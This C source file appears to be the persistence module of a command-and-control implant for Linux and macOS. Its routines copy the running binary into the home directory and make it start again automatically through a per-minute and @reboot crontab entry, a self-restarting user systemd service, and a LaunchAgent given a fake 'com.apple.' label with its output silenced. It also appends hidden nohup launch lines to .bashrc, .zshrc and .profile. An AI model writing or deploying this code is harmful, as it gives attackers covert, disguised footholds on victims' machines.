/*
 * Persist.c — Persistence installation / removal for Linux and macOS.
 *
 * Methods:
 *   PERSIST_CRON      — Linux/macOS: add a per-minute crontab entry
 *   PERSIST_SYSTEMD   — Linux:  create a user systemd service
 *   PERSIST_LAUNCHD   — macOS:  create a LaunchAgent plist
 *   PERSIST_BASHRC    — Both:   append to ~/.bashrc / ~/.zshrc
 */

#include "DemonPosix.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

/* ── Helper: get absolute path of the running executable ────────────── */
static void get_self_path(char *out, size_t sz)
{
#ifdef __APPLE__
    uint32_t len = (uint32_t)sz;
    if (_NSGetExecutablePath(out, &len) != 0) out[0] = '\0';
#else
    ssize_t n = readlink("/proc/self/exe", out, sz-1);
    if (n > 0) out[n] = '\0';
    else       out[0] = '\0';
#endif
}

/* ── Helper: write a file atomically ────────────────────────────────── */
static bool write_file(const char *path, const char *content, mode_t mode)
{
    FILE *f = fopen(path, "w");
    if (!f) return false;
    fputs(content, f);
    fclose(f);
    chmod(path, mode);
    return true;
}

/* ── Helper: run a shell command ─────────────────────────────────────── */
static int run_cmd(const char *cmd)
{
    return system(cmd);
}

/* ─────────────────────────────────────────────────────────────────────
 * PERSIST_CRON
 * ──────────────────────────────────────────────────────────────────── */
static bool persist_cron_install(const char *name)
{
    char self[4096] = "";
    get_self_path(self, sizeof(self));
    if (!self[0]) return false;

    /* Copy the binary to a stable location */
    char dest[4096];
    snprintf(dest, sizeof(dest), "%s/.local/share/%s", getenv("HOME") ?: "/tmp", name);

    char cmd[8192];
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s' 2>/dev/null && chmod +x '%s'", self, dest, dest);
    run_cmd(cmd);

    /* Add crontab entry: @reboot and every minute */
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null | grep -v '%s'; "
             "echo '@reboot %s'; "
             "echo '* * * * * %s') | crontab - 2>/dev/null",
             dest, dest, dest);
    return run_cmd(cmd) == 0;
}

static bool persist_cron_remove(const char *name)
{
    char dest[4096];
    snprintf(dest, sizeof(dest), "%s/.local/share/%s", getenv("HOME") ?: "/tmp", name);
    char cmd[8192];
    snprintf(cmd, sizeof(cmd),
             "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null",
             dest);
    run_cmd(cmd);
    snprintf(cmd, sizeof(cmd), "rm -f '%s'", dest);
    run_cmd(cmd);
    return true;
}

/* ─────────────────────────────────────────────────────────────────────
 * PERSIST_SYSTEMD  (Linux only)
 * ──────────────────────────────────────────────────────────────────── */
#ifndef __APPLE__
static bool persist_systemd_install(const char *name)
{
    char self[4096] = "";
    get_self_path(self, sizeof(self));
    if (!self[0]) return false;

    char dest[4096];
    snprintf(dest, sizeof(dest), "%s/.local/share/%s", getenv("HOME") ?: "/tmp", name);
    char cmd[8192];
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s' && chmod +x '%s'", self, dest, dest);
    run_cmd(cmd);

    /* Create the service directory */
    char svc_dir[4096];
    snprintf(svc_dir, sizeof(svc_dir), "%s/.config/systemd/user", getenv("HOME") ?: "/tmp");
    mkdir(svc_dir, 0755);

    /* Write the unit file */
    char unit_path[4096];
    snprintf(unit_path, sizeof(unit_path), "%s/%s.service", svc_dir, name);

    char unit_content[2048];
    snprintf(unit_content, sizeof(unit_content),
             "[Unit]\n"
             "Description=%s service\n"
             "After=network.target\n\n"
             "[Service]\n"
             "Type=simple\n"
             "ExecStart=%s\n"
             "Restart=always\n"
             "RestartSec=5\n\n"
             "[Install]\n"
             "WantedBy=default.target\n",
             name, dest);

    if (!write_file(unit_path, unit_content, 0644)) return false;

    /* Enable and start */
    snprintf(cmd, sizeof(cmd), "systemctl --user enable '%s.service' 2>/dev/null", name);
    run_cmd(cmd);
    snprintf(cmd, sizeof(cmd), "systemctl --user start '%s.service' 2>/dev/null", name);
    run_cmd(cmd);
    return true;
}

static bool persist_systemd_remove(const char *name)
{
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "systemctl --user stop '%s.service' 2>/dev/null", name);
    run_cmd(cmd);
    snprintf(cmd, sizeof(cmd), "systemctl --user disable '%s.service' 2>/dev/null", name);
    run_cmd(cmd);

    char unit_path[4096];
    snprintf(unit_path, sizeof(unit_path),
             "%s/.config/systemd/user/%s.service",
             getenv("HOME") ?: "/tmp", name);
    snprintf(cmd, sizeof(cmd), "rm -f '%s'", unit_path);
    run_cmd(cmd);
    return true;
}
#endif /* !__APPLE__ */

/* ─────────────────────────────────────────────────────────────────────
 * PERSIST_LAUNCHD  (macOS only)
 * ──────────────────────────────────────────────────────────────────── */
#ifdef __APPLE__
static bool persist_launchd_install(const char *name)
{
    char self[4096] = "";
    get_self_path(self, sizeof(self));
    if (!self[0]) return false;

    char dest[4096];
    snprintf(dest, sizeof(dest), "%s/Library/Application Support/%s",
             getenv("HOME") ?: "/tmp", name);
    char cmd[8192];
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s' && chmod +x '%s'", self, dest, dest);
    run_cmd(cmd);

    /* Create LaunchAgents directory */
    char la_dir[4096];
    snprintf(la_dir, sizeof(la_dir), "%s/Library/LaunchAgents", getenv("HOME") ?: "/tmp");
    mkdir(la_dir, 0755);

    /* Write the plist */
    char plist_path[4096];
    snprintf(plist_path, sizeof(plist_path), "%s/com.apple.%s.plist", la_dir, name);

    char plist[2048];
    snprintf(plist, sizeof(plist),
             "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
             "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n"
             "  \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
             "<plist version=\"1.0\">\n"
             "<dict>\n"
             "  <key>Label</key>          <string>com.apple.%s</string>\n"
             "  <key>ProgramArguments</key>\n"
             "  <array><string>%s</string></array>\n"
             "  <key>RunAtLoad</key>      <true/>\n"
             "  <key>KeepAlive</key>      <true/>\n"
             "  <key>StandardOutPath</key><string>/dev/null</string>\n"
             "  <key>StandardErrorPath</key><string>/dev/null</string>\n"
             "</dict>\n"
             "</plist>\n",
             name, dest);

    if (!write_file(plist_path, plist, 0644)) return false;

    snprintf(cmd, sizeof(cmd), "launchctl load -w '%s' 2>/dev/null", plist_path);
    run_cmd(cmd);
    return true;
}

static bool persist_launchd_remove(const char *name)
{
    char plist_path[4096];
    snprintf(plist_path, sizeof(plist_path),
             "%s/Library/LaunchAgents/com.apple.%s.plist",
             getenv("HOME") ?: "/tmp", name);
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "launchctl unload -w '%s' 2>/dev/null", plist_path);
    run_cmd(cmd);
    snprintf(cmd, sizeof(cmd), "rm -f '%s'", plist_path);
    run_cmd(cmd);
    return true;
}
#endif /* __APPLE__ */

/* ─────────────────────────────────────────────────────────────────────
 * PERSIST_BASHRC
 * ──────────────────────────────────────────────────────────────────── */
static bool persist_bashrc_install(const char *name)
{
    char self[4096] = "";
    get_self_path(self, sizeof(self));
    if (!self[0]) return false;

    char dest[4096];
    snprintf(dest, sizeof(dest), "%s/.local/share/%s", getenv("HOME") ?: "/tmp", name);
    char cmd[8192];
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s' && chmod +x '%s'", self, dest, dest);
    run_cmd(cmd);

    /* Files to append to */
    const char *rc_files[] = {
        "/.bashrc", "/.zshrc", "/.profile", NULL
    };
    const char *home = getenv("HOME") ?: "";

    char marker[256];
    snprintf(marker, sizeof(marker), "# %s-persist", name);

    for (int i = 0; rc_files[i]; i++) {
        char path[4096];
        snprintf(path, sizeof(path), "%s%s", home, rc_files[i]);

        /* Check if file exists */
        if (access(path, F_OK) != 0) continue;

        /* Check if already installed */
        snprintf(cmd, sizeof(cmd), "grep -q '%s' '%s' 2>/dev/null", marker, path);
        if (run_cmd(cmd) == 0) continue; /* already present */

        /* Append */
        FILE *f = fopen(path, "a");
        if (f) {
            fprintf(f, "\n%s\nnohup %s &>/dev/null &\n", marker, dest);
            fclose(f);
        }
    }
    return true;
}

static bool persist_bashrc_remove(const char *name)
{
    const char *rc_files[] = {
        "/.bashrc", "/.zshrc", "/.profile", NULL
    };
    const char *home = getenv("HOME") ?: "";
    char marker[256];
    snprintf(marker, sizeof(marker), "# %s-persist", name);

    for (int i = 0; rc_files[i]; i++) {
        char path[4096], cmd[8192];
        snprintf(path, sizeof(path), "%s%s", home, rc_files[i]);
        if (access(path, F_OK) != 0) continue;
        /* Remove the marker line and the nohup line after it */
        snprintf(cmd, sizeof(cmd),
                 "sed -i'' '/%s/,+1d' '%s' 2>/dev/null",
                 marker, path);
        run_cmd(cmd);
    }
    return true;
}

/* ─────────────────────────────────────────────────────────────────────
 * Public API
 * ──────────────────────────────────────────────────────────────────── */
bool PersistInstall(int method, const char *name)
{
    switch (method) {
    case PERSIST_CRON:    return persist_cron_install(name);
#ifdef __APPLE__
    case PERSIST_LAUNCHD: return persist_launchd_install(name);
#else
    case PERSIST_SYSTEMD: return persist_systemd_install(name);
#endif
    case PERSIST_BASHRC:  return persist_bashrc_install(name);
    default:              return false;
    }
}

bool PersistRemove(int method, const char *name)
{
    switch (method) {
    case PERSIST_CRON:    return persist_cron_remove(name);
#ifdef __APPLE__
    case PERSIST_LAUNCHD: return persist_launchd_remove(name);
#else
    case PERSIST_SYSTEMD: return persist_systemd_remove(name);
#endif
    case PERSIST_BASHRC:  return persist_bashrc_remove(name);
    default:              return false;
    }
}
